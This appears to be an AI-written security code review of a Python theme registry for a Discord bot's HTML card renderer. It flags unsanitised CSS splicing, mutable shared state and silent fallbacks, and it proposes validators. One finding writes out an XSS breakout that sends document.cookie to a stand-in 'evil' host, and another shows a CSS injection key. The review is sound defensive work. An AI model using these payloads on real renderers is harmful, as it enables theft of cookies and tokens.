# Adversarial Review: atlas_themes.py

**Verdict:** needs-attention
**Ring:** 2
**Reviewed:** 2026-04-09
**LOC:** 477
**Reviewer:** Claude (delegated subagent)
**Total findings:** 12 (1 critical, 5 warnings, 6 observations)

## Summary

The registry itself is consistent (every theme has the full 14-key shape and the 16 CSS vars required by the engine) and `get_theme()` has a sane default-fallback. The real hazards are all about the contract *around* the data: raw string values get spliced into HTML attributes and `<style>` blocks by `atlas_html_engine.wrap_card`, there is no integrity seal on the dict (it is a module-level mutable global shared across every render), and the write path `flow_wallet.set_theme()` never validates `theme_id` against `THEMES`, so a single bad caller can persist junk that later blows up `get_theme_for_render()` consumers.

## Findings

### CRITICAL #1: Theme dict values are the raw-HTML splice sources flagged by Ring 1 — registry has zero sanitization or structural validation

**Location:** `C:/Users/natew/Desktop/discord_bot/atlas_themes.py:14-387` (the `THEMES` dict end-to-end) — consumed at `atlas_html_engine.py:560-577`
**Confidence:** 0.82
**Risk:** Every `status_gradient`, `card_border`, `divider_style`, `stat_left_border_*`, `stat_box_shadow*`, `extra_css`, and `vars[*]` value in this registry is concatenated raw into either an inline `style=` attribute or a `<style>...</style>` block with no escaping, no regex allowlist, and no CSS-value validation. The Ring 1 review of `atlas_html_engine.py` already flagged the engine side of this splice (CRITICAL #3 at `atlas_html_engine.py:568-577`). The registry is the *other half of the contract* and it provides no integrity guarantee whatsoever: `THEMES` is a plain module-level `dict`, fully mutable at runtime, no freeze, no validator, no schema. `get_theme()` happily returns whatever is in the dict and hands it to the engine.
**Vulnerability:** The defence-in-depth model relies entirely on "these strings happen to be hardcoded constants right now." Three independent failure modes:
1. **Untrusted-theme creep.** The moment any future change writes a theme value from user input, DB, config file, or plugin (e.g., a `/god theme create` command, a JSON import, a per-guild palette), stored-XSS-equivalent in Playwright becomes reachable — the attacker breaks out of the `style=""` attribute with `"><script>fetch('https://evil/' + document.cookie)</script>` and the renderer happily embeds it. The CLAUDE.md Agent Roster section already shows plans for theme creation (`atlas-theme-designer` skill). This file has no defence against that.
2. **Editor typo → all-card outage.** A single stray unescaped quote, unbalanced paren, or stray `</style>` in any of the ~14 hand-authored CSS strings per theme (126 strings total) breaks *every card rendered by every cog* for every user on that theme. Recovery requires a code push, not a data fix. There is no self-test in this module to catch it.
3. **CSS custom-property injection.** The `vars` dict is flattened into `--{k}: {v};` at engine line 560 with no validation on keys or values. A key containing `:` or `\n` (e.g., if a future maintainer adds `"gold; background:url(evil)": "#fff"`) closes the declaration early and injects whatever comes after. Colour values like `"rgba(226,192,92,0.04)"` already contain commas and parens that would trip naive allow-list validation — so any guard added later has to be careful.
**Impact:** Render corruption that silently bricks every `/atlas`, `/flow`, `/stats`, casino, sportsbook, highlight, pulse, and trade card at once — these are the cards powering the user-facing bot surface. Worst case: arbitrary script execution inside the Playwright render process, which has network access and could exfiltrate tokens/cookies from the host environment. Because `atlas_html_engine.py` caches Playwright pages in a pool of 4 pre-warmed pages (per CLAUDE.md "Rendering Stack"), a poisoned page could persist across renders.
**Fix:** This file is the right place to enforce the contract, not the engine.
(a) Add a `_SAFE_CSS_VALUE = re.compile(r"^[A-Za-z0-9\s,.%#()\-\+/*]+$")` (tune to cover the characters CSS literal values actually need) and a `_validate_theme(theme: dict) -> None` helper that runs at *import time* over every theme, raising `ValueError` on any mismatch. This catches author typos at process start, before any card renders.
(b) Export the allowed key set as `_REQUIRED_VAR_KEYS = frozenset({"bg", "gold", "gold-bright", ...})` and assert it in the validator.
(c) Wrap `THEMES` in `types.MappingProxyType` after construction so no cog can mutate it accidentally.
(d) For `extra_css`, the free-form CSS blocks — at minimum lint for balanced braces and the absence of `</style>` / `<script` substrings.
(e) Rename `get_theme()` to take an explicit `*, validate: bool = True` and never return a theme that fails validation; fall back to `DEFAULT_THEME` with a log warning. This bounds the blast radius of a bad author edit from "total outage" to "one broken theme".

### WARNING #1: `get_theme()` returns the registry dict by reference — any downstream mutation corrupts all subsequent renders

**Location:** `C:/Users/natew/Desktop/discord_bot/atlas_themes.py:468-472`
**Confidence:** 0.78
**Risk:** `get_theme()` does `return THEMES[theme_id]`, not a copy. Every renderer that takes the returned dict and does something like `theme.setdefault("hero_class", "")` or `theme["vars"]["gold"] = "#fff"` mutates the shared module-level global, and every later renderer sees the mutation. The current callers (`atlas_html_engine.wrap_card`, `flow_cards.py`, `atlas_home_renderer.py`) only read, but there is no contract forbidding writes, and `theme.get("hero_class", "")` is one `setdefault` refactor away from corruption.
**Vulnerability:** Mutable shared state across concurrent Playwright renders. With the pool of 4 pre-warmed pages and the bot fanning out card builds across cogs, a single mis-written renderer can persistently corrupt every subsequent card on every user on every theme until process restart. There is no lock, no `copy.deepcopy`, no `MappingProxyType`.
**Impact:** A "works on my machine" bug in any future renderer that touches the theme dict manifests as user-visible render corruption on unrelated cards, cogs, and users. Debugging is painful because the source theme file looks fine and only the in-memory state is wrong.
**Fix:** Either return `copy.deepcopy(THEMES[theme_id])`, or wrap `THEMES` and each inner `vars` / `overlays` in `types.MappingProxyType` / `tuple` at module import, making them effectively read-only. The latter is cheaper at render time (`get_theme` stays O(1)) and catches the bug statically at the attempted write.

### WARNING #2: `get_theme(None)` silently returns the default instead of being an error — masks upstream bugs

**Location:** `C:/Users/natew/Desktop/discord_bot/atlas_themes.py:468-472`
**Confidence:** 0.62
**Risk:** Any call with a falsy `theme_id` (None, empty string, `0`, `False`) or a theme key not in `THEMES` (typo, renamed theme, stale user-preference in DB) is swallowed and replaced with `obsidian_gold`. There is no log line, no telemetry, no indication that the user's chosen theme was rejected.
**Vulnerability:** A rename of a theme key (e.g., shipping a season where `digital_rain` → `matrix_rain`) silently reverts every user who picked it, and no one notices until a user complains. The same applies to DB drift — `flow_wallet.set_theme()` does not validate against the registry, so a stale or mis-typed `theme_id` persists in `users_table.card_theme` indefinitely and every render silently substitutes the default.
**Impact:** Cosmetic degradation is hidden. More concerning: a global theme outage (see CRITICAL #1 — one bad theme string breaks import) is indistinguishable from "user hasn't picked one", because both produce the default theme. Observability is zero.
**Fix:** Log at `warning` level when a non-None `theme_id` is requested but not found: `log.warning("theme '%s' not in registry, falling back to %s", theme_id, DEFAULT_THEME)`. Optionally expose a metrics counter. Consider raising for truly invalid input if the caller passes an empty string (distinct from `None`).

### WARNING #3: `get_overlay_html([bad_key])` silently returns empty string, hiding overlay-key typos

**Location:** `C:/Users/natew/Desktop/discord_bot/atlas_themes.py:475-477`
**Confidence:** 0.72
**Risk:** `OVERLAYS.get(k, "")` treats a missing overlay key as "render nothing", with no log and no error. Combined with the theme registry — where overlay lists are hand-authored string literals like `"scanlines", "vignette_warm"` — a typo in a theme's `overlays` list (e.g., `"scanlies"`) disappears that overlay at render time and no one notices until someone eyeballs the card.
**Vulnerability:** No integration between theme validation and overlay registry. New overlay keys added/removed in `OVERLAYS` (lines 392-465) do not break any theme that references a missing key. The only way to catch it is visual inspection of every card after every edit.
**Impact:** Themes silently degrade with missing HUD brackets, rim lights, scanlines, etc. When a future maintainer deletes an unused overlay key, every theme still referencing it silently loses that visual element.
**Fix:** In the `_validate_theme()` helper from CRITICAL #1, assert every key in `theme["overlays"]` is in `OVERLAYS`. Log at `warning` level in `get_overlay_html` when a key is missing: `log.warning("unknown overlay key %r", k)`.

### WARNING #4: `extra_css` blocks are rendered inside a single `<style>` tag — any one theme's syntax error can cascade

**Location:** `C:/Users/natew/Desktop/discord_bot/atlas_themes.py:38-46, 80-88, 122-130, 168-176, 210-215, 249-257, 291-296, 330-338, 372-377` (every theme's `extra_css`) — consumed at `atlas_html_engine.py:584-589`
**Confidence:** 0.7
**Risk:** Each theme embeds a multi-line CSS block in the `extra_css` field, written by hand (no linter, no validation, no compile step). These blocks are concatenated into a single `<style>...</style>` block by `atlas_html_engine.wrap_card` (line 588 splices `{extra_css}` directly). A single unterminated `/*` comment, missing `}`, or stray `</style>` token in any theme's `extra_css` breaks CSS parsing of everything that follows in the same `<style>` block — including the `_SHARED_CSS` immediately before it and tokens after.
**Vulnerability:** There is zero static check, and the failure mode is silent in Playwright (parsing stops at the error, rest of CSS is ignored, card renders with broken styles). The 9 themes embed 9 different gradient/filter CSS blocks that were clearly copy-paste-tuned; editing one without testing all is exactly the kind of change that a fast patch would ship.
**Impact:** Broken cards for one theme's users, silently, with no error trace in any log. Worse: a user whose theme has the broken `extra_css` will see their card look wrong, but a commissioner diagnosing the issue with their own (working) theme will not reproduce it.
**Fix:** Add a small CSS-sanity validator to the `_validate_theme()` helper proposed in CRITICAL #1: balance `{` and `}` counts, forbid `</style>` substring, forbid unterminated `/*`. A real CSS parser would be overkill; the three checks above catch ~all realistic author mistakes. Run at import.

### WARNING #5: Theme `vars` keys use hyphens (e.g., `"gold-bright"`) that will shadow, not namespace, `Tokens.to_css_vars()` output

**Location:** `C:/Users/natew/Desktop/discord_bot/atlas_themes.py:18-34` (and every other theme's `vars` dict) — merge with `atlas_style_tokens.py:162-165` at `atlas_html_engine.py:584-586`
**Confidence:** 0.68
**Risk:** `atlas_html_engine.wrap_card()` emits CSS in this order:
```
{Tokens.to_css_vars()}   ← first :root block
{theme_css}              ← second :root block (from this file)
{_SHARED_CSS}
{extra_css}
```
Both blocks define CSS custom properties with identical names (e.g., both emit `--gold`). CSS cascade rules resolve this to "last wins within the same specificity", which is the intended behaviour *only if every theme defines every variable that base tokens do*. When a theme omits a var, the base token shows through — good — but there is no static check that the theme's var set is a subset of the base token's var set. A typo in a theme's var key (e.g., `"gold-brght"`) silently creates a net-new custom property that no stylesheet consumes, and the misspelled token falls back to the base value.
**Vulnerability:** No schema, no test. Theme authors rely on "grep for `--gold-bright` in `_SHARED_CSS`" to know which vars are consumed, and on visual diffing of rendered output to know whether their override is even applied. The split between `Tokens.to_css_vars()` (the authoritative list) and hand-authored `vars` dicts here means there is no single source of truth — they can drift.
**Impact:** Theme regressions that look correct in source but wrong on screen, especially when adding new variables to `atlas_style_tokens.py`.
**Fix:** In the `_validate_theme()` helper, cross-check each theme's `vars` keys against a canonical set (either imported from `Tokens._CSS_MAP` or hardcoded here as `_KNOWN_VAR_KEYS`). Warn on unknown keys, optionally warn on missing keys.

### OBSERVATION #1: No type hints, no `TypedDict`, no dataclass — the shape of a theme is documented nowhere

**Location:** `C:/Users/natew/Desktop/discord_bot/atlas_themes.py:14-387`
**Confidence:** 0.85
**Risk:** `THEMES` is a `dict[str, dict]`. The docstring at the top says "Each theme overrides only the tokens that differ from base" but does not document which fields are required, which are optional, or what their types are. A new maintainer has to read all 9 themes to reverse-engineer the schema, and any consumer that does `theme.get("hero_class", "")` is the *only* evidence that `hero_class` is even a valid field.
**Fix:** Define a `class Theme(TypedDict, total=False): ...` with all 14 fields, annotated. Change `THEMES: dict[str, Theme]` and `get_theme() -> Theme`. This doubles as partial compile-time validation (`mypy --strict` will catch typos in field names).

### OBSERVATION #2: Module docstring promises "base tokens → theme overrides → render" merge — but merge is implicit and happens in the engine, not here

**Location:** `C:/Users/natew/Desktop/discord_bot/atlas_themes.py:1-10`
**Confidence:** 0.6
**Risk:** Reading the file in isolation, a newcomer would expect a merge function — something like `get_merged_theme(theme_id) -> dict` that returns base + overrides. Instead the "merge" is implicit: both `:root` blocks are emitted in `atlas_html_engine.py` and CSS cascade resolves it. This is a hidden coupling. If anyone adds a theme-related helper that reads `theme["vars"]` directly (without going through the engine), they will get only the override set, not the merged set, and will be subtly wrong.
**Fix:** Either rename the docstring to match reality ("Theme registry. Merge happens at CSS cascade time in atlas_html_engine.wrap_card"), or add the `get_merged_theme` helper and use it everywhere.

### OBSERVATION #3: Hero-class names use hyphen-prefixed kebab-case (`hero-gradient-gold`, `hero-stamp-broker`) but some themes break the pattern (`hero-glow-venom`, `hero-glow-blackout`)

**Location:** `C:/Users/natew/Desktop/discord_bot/atlas_themes.py:37, 79, 121, 167, 209, 248, 290, 329, 371`
**Confidence:** 0.5
**Risk:** There is no style guide for theme authoring. The `hero_class` names are inconsistent — most are `hero-gradient-*` but `venom_strike` uses `hero-glow-venom`, `shadow_broker` uses `hero-stamp-broker`, `blackout_protocol` uses `hero-glow-blackout`. These are not bugs — the CSS classes match the `extra_css` blocks within each theme — but the convention is unclear. A new author may not know whether to name their new theme `hero-gradient-foo` or `hero-foo-gradient`.
**Fix:** Add a one-line comment at the top of the `THEMES` dict documenting the naming convention for `hero_class` and `extra_css` class names.

### OBSERVATION #4: No `label` or `emoji` uniqueness check — two themes could ship with the same label and break the theme picker UI

**Location:** `C:/Users/natew/Desktop/discord_bot/atlas_themes.py:15-386`
**Confidence:** 0.55
**Risk:** `economy_cog.py:1122-1131` iterates `THEMES.items()` to build a Discord button per theme, keyed on `theme_data['label']` and `theme_data["emoji"]`. If two themes shipped with the same label (e.g., two authors both named their theme "Matrix"), the buttons would collide visually. Discord does not enforce uniqueness so the picker would just render two buttons with identical labels.
**Impact:** Cosmetic, but confusing; and the theme picker is capped at 25 buttons per view (Discord select-menu limit, per `_atlas_focus.md`). 9 themes today, 25 cap — plenty of headroom, but no enforcement at theme-add time.
**Fix:** In the `_validate_theme_registry()` helper (paired with CRITICAL #1), assert labels and emoji are unique across themes. Also assert `len(THEMES) <= 25` so the Discord cap is enforced at import.

### OBSERVATION #5: `DEFAULT_THEME = "obsidian_gold"` is a string literal with no static link to the actual registry key

**Location:** `C:/Users/natew/Desktop/discord_bot/atlas_themes.py:12, 472`
**Confidence:** 0.55
**Risk:** If someone renames `obsidian_gold` to something else (e.g., `obsidian_default`) and forgets to update line 12, `get_theme(None)` will KeyError at line 472 on the first render, crashing Playwright page rendering for every call that passes `None` or a bad theme id. No test catches it.
**Fix:** Assert at module-import time: `assert DEFAULT_THEME in THEMES, f"DEFAULT_THEME {DEFAULT_THEME!r} missing from THEMES"`. Or lift it to the top of `get_theme()` as a runtime check with a helpful message instead of `KeyError`.

### OBSERVATION #6: `get_overlay_html` returns concatenated string with `\n` separator but most overlays are `<div>` elements with no semantic relationship to whitespace — the newline is cosmetic only

**Location:** `C:/Users/natew/Desktop/discord_bot/atlas_themes.py:475-477`
**Confidence:** 0.45
**Risk:** Design smell only — the join character is irrelevant to rendering, but the function signature doesn't take a list in any particular order and there is no documentation saying whether overlays are z-ordered by list order (they are — CSS z-index is set inline in each overlay's div). A maintainer could re-sort the list without understanding that the implicit ordering of scanlines/vignette/HUD/rim matters for the visual stack-up.
**Fix:** Add a docstring: "Overlays are z-ordered by list position via inline z-index. Order: background overlays first (scanlines, vignette), foreground decorations last (HUD, rim)." Optionally document the z-index ranges used by each overlay category.

## Cross-cutting Notes

The root problem across this file and `atlas_html_engine.py` (Ring 1 CRITICAL #3) is that the theme system has *no contract boundary*. Values flow from hand-authored Python strings → `get_theme()` → f-string splice into HTML attributes and style blocks, with zero validation, no type, no schema, no immutability guarantee. Every proposed fix above converges on the same discipline: make this file the contract-owner — add a `_validate_theme_registry()` helper that runs at import, add a `TypedDict` schema, wrap in `MappingProxyType`, and cross-check against `atlas_style_tokens.Tokens`. Once that's in place, the engine's splice stops being scary because the inputs are guaranteed clean. Without it, every future theme edit is a potential outage and every future "load theme from DB/plugin/config" is a potential RCE.

The same pattern (mutable module-level dict used across the HTML render pipeline with no schema) likely repeats in `atlas_style_tokens.py` and `atlas_colors.py` — worth checking when those files reach Ring 2.
